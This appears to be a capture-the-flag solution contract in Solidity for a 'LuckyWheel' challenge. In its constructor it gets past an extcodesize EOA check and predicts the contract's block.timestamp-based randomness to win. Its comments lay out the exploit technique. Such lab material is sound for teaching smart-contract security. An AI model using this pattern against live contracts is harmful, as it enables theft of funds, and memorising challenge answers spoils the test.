// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.20;

import "../../contracts/TrueRandom/Setup.sol";
import "../../contracts/TrueRandom/LuckyWheel.sol";

contract Solve {
    Setup public setup; // Setup contract address
    LuckyWheel public luckyWheel; // LuckyWheel contract address

    constructor(address _setup) payable {
        require(msg.value == 0.1 ether, "LuckyWheel: INVALID_AMOUNT");
        setup = Setup(_setup);
        luckyWheel = LuckyWheel(setup.luckyWheel());

        for (uint256 i = 0; i < 1_000; i++) {
            uint256 random = uint256(keccak256(abi.encodePacked(i, block.timestamp, address(this))));
            if (random % 100 == 0) {
                luckyWheel.wannaLuck(i);
            }
        }

        // Explain:
        // 1. LuckyWheel check if msg.sender is EOA by extcodesize
        // 2. Tips: The extcodesize of a contract is 0 if it is in construction
        // 3. So we can call wannaLuck function in constructor
        // 4. We pre-calculate 1_000 random number and check if it is divisible by 100 or not to win
        // 5. Tips: We can pre-calculate off-chain and deploy to save gas fee (It is not perfect for every call)

        // Check if solved
        require(setup.isSolved(), "Not solved");
    }
}
